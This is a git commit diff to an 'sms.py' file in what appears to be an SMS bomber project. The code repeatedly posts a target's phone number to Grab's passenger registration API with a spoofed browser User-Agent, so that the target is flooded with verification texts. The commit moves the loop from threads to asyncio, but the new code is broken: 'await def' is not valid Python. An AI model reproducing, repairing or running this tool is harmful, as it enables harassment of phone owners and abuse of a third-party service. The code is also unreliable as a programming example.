718ea1362684f61bbbe51276c0f762dd8b01a5ba
Abolfazl Farzin <96248859+Craboli83@users.noreply.github.com>
2022-05-25 22:58:19 +0430

    Update sms.py

--- bomber/functions/sms.py
+++ bomber/functions/sms.py
@@ -1,7 +1,8 @@
 import requests
 import threading
+import asyncio
 
-def sent(phone):
+await def sent(phone):
     try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
         return True
@@ -9,6 +10,7 @@ def sent(phone):
         print("[-] Not sent!")
 
 def send_sms(phone, count):
+    loop = asyncio.get_event_loop()
     for i in range(count):
-        tr = threading.Thread(target=sent, args=(phone))
-        tr.start()
+        tr = loop.create_task(sent(phone))
+        print(tr)
